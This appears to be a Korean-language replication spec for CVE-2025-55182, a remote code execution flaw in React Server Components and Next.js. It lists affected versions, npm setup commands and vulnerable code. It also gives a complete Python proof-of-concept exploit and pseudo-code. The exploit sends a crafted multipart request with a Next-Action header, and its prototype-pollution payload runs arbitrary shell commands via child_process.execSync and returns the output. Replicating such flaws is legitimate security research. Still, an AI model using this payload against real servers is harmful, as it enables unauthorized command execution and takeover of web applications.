CVE-2025-55182_ENV.md

# Replication Environment Tech Spec

## 대상 소프트웨어(Target Application Specification)

- 제품명/버전 :
    - React / 19.0.0, 19.1.0, 19.1.1, 19.2.0
    - Next.js / 15.0.x, 15.1.x, 15.2.x, 15.3.x, 15.4.x, 15.5.x, 16.0.x
    
- 배포 방식 :
    
    **CVE-2025-66478**가 병합되면서 React와 Next.js 2가지 방법 존재
    
    1. React
    - React 프로젝트 설치
    
    ```
    npx create-react-app .
    ```
    
    - React 취약점 발견 버전으로 다운그레이드 (ex. 19.1.0)
    
    ```
    npm install react@19.1.0 react-dom@19.1.0
    ```
    
    ※package.json 버전 적용 확인 필요
    
    ```
    "dependencies": { 
        "react": "19.1.0", 
        "react-dom": "19.1.0", ... 
    }
    ```
    
    1. Next.js
    - Next.js 취약점 발견 버전 설치 (ex. 16.0.6)
    
    ```
    npx create-next-app@16.0.6 sample-app --yes
    ```
    
    - Next.js 실행
    
    ```
    cd sample app
    npm run build #확인 필요
    npm run dev
    ```
    

---

## 시스템 환경(System Environment)

- OS : 환경 무관
- Server Runtime : Node.js 24.12 (LTS)
- Web Framework : Next.js 16.0.6

---

## 이 외 필요한 조건

### 1. 취약점이 발견된 소스 코드

```jsx
// ReactFlightDOMServerNode.js (또는 관련 파일의 유사한 로직)

function requireModule(moduleReference) {
  // ... 모듈 로딩 로직 (번들 맵 사용)
  
  var moduleExports = require(moduleReference.id);
  return moduleExports;
}
```

### 2. PoC 코드 ([GitHub](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py))

```python
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
```

### 3. pseudo-code

1. **payload**

```
// Flight 프로토콜의 참조($) 문법을 사용하여 청크 간 연결 고리 생성
SET chunk_0 = JSON_STRINGIFY(MALICIOUS_CHUNK)
SET chunk_1 = "$@0"  // Reference to Chunk 0 (Self-Referencing)

DEFINE MULTIPART_FORM_DATA:
	Field "0": chunk_0
	Field "1": chunk_1
```

chunk1 → 지연 참조 문법 사용

1. 위장 및 캡슐화

```
DEFINE MULTIPART_FORM_DATA:
	Field "0": chunk_0
	Field "1": chunk_1
```

정상적인 RSC 트래픽으로 위장

1. 경로 지정

```
// Server Action 처리를 강제하기 위한 헤더 설정
SET HTTP_HEADERS:
	"Content-Type": "multipart/form-data"
	"Next-Action": "ANY_ARBITRARY_ID"  // Vulnerability Trigger
```

Next-Action으로 서버 함수를 실행한다는 명시적 지시 작성

1. 공격 벡터 주입

```
// Step 3: Transmission
SEND HTTP POST to Target_URL
	WITH HEADERS = HTTP_HEADERS
	WITH BODY = MULTIPART_FORM_DATA
```

1. 결과 확인

```
// Step 4: Exfiltration & Verification
RECEIVE Response FROM Server

IF Response CONTAINS "Error" AND Response CONTAINS Command_Output THEN
	RETURN "VULNERABILITY CONFIRMED: " + Command_Output
ELSE
	RETURN "EXPLOIT FAILED"
```

**1~5 과정 병합된 pseudo-code**

```
SET chunk_0 = JSON_STRINGIFY(MALICIOUS_CHUNK)
SET chunk_1 = "$@0"  // Reference to Chunk 0 (Self-Referencing)

DEFINE MULTIPART_FORM_DATA:
	Field "0": chunk_0
	Field "1": chunk_1

SET HTTP_HEADERS:
	"Content-Type": "multipart/form-data"
	"Next-Action": "ANY_ARBITRARY_ID"

SEND HTTP POST to Target_URL
	WITH HEADERS = HTTP_HEADERS
	WITH BODY = MULTIPART_FORM_DATA

RECEIVE Response FROM Server

IF Response CONTAINS "Error" AND Response CONTAINS Command_Output THEN
	RETURN "VULNERABILITY CONFIRMED: " + Command_Output
ELSE
	RETURN "EXPLOIT FAILED"
```

참고사항

https://www.youtube.com/watch?v=jOoUb5Dk6jk
